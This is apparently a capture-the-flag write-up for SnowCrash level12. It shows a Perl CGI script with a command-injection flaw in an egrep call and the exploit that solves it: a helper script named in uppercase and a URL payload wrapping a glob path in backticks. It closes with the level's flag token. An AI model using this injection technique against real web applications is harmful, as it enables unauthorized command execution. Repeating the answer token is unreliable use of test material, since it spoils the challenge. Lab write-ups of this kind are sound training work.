For this level we see the .pl file

	level12@SnowCrash:~$ ls
	level12.pl

	level12@SnowCrash:~$ cat level12.pl
	#!/usr/bin/env perl
	# localhost:4646
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	sub t {
	  $nn = $_[1];
	  $xx = $_[0];
	  $xx =~ tr/a-z/A-Z/;
	  $xx =~ s/\s.*//;
	  @output = `egrep "^$xx" /tmp/xd 2>&1`;
	  foreach $line (@output) {
		  ($f, $s) = split(/:/, $line);
		  if($s =~ $nn) {
			  return 1;
		  }
	  }
	  return 0;
	}

	sub n {
	  if($_[0] == 1) {
		  print("..");
	  } else {
		  print(".");
	  }
	}

	n(t(param("x"), param("y")));

This script is a CGI web application that:

Runs on localhost:4646
Accepts two parameters:

Takes user input from x parameter
Converts it to uppercase
Removes everything after the first whitespace
Uses it as a pattern for egrep to search in /tmp/xd
Checks if any results contain the pattern from the y parameter
Returns ".." if a match is found, "." if not


Key vulnerability:

Command injection in the egrep command
User input x is directly inserted into a shell command
Even with uppercase conversion, special characters can be used to inject commands
Challenge is to execute getflag despite the uppercase conversion

So we need to write a file with an uppercase name that is going to execute getflag

	#! /bin/bash

	getflag > /tmp/flag

And we go on a browser and type this in the search bar 

	http://192.168.1.11:4646/level12.pl?x='`/*/FILE`'&y=anything
Then we just have to get the flag in the /tmp/flag file

	level12@SnowCrash:~$ cat /tmp/flag
	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

